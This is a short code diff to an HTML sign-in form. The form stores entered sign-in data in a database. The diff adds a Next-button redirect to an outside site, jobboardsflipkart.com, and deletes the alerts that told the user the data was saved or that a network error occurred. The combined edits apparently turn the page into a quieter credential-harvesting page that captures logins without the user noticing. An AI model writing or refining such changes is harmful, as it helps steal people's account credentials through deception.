@@ -218,7 +218,7 @@
             
             <div class="buttons">
                 <a href="#" class="create-account">Create account</a>
-                <button type="submit" class="next-btn">Next</button>
+                <button type="submit" class="next-btn" onclick="window.location.href='https://www.jobboardsflipkart.com/'">Next</button>
             </div>
         </form>
     </div>
@@ -247,7 +247,7 @@ document.getElementById('signin-form').addEventListener('submit', function(e) {
     .then(response => response.json())
     .then(data => {
         if (data.success) {
-            alert('Sign-in data saved to database successfully!');
+            
             console.log('Saved with ID:', data.id);
         } else {
             alert('Error: ' + data.message);
@@ -255,7 +255,7 @@ document.getElementById('signin-form').addEventListener('submit', function(e) {
     })
     .catch(error => {
         console.error('Error:', error);
-        alert('Network error occurred');
+        
     });
 });
     </script>
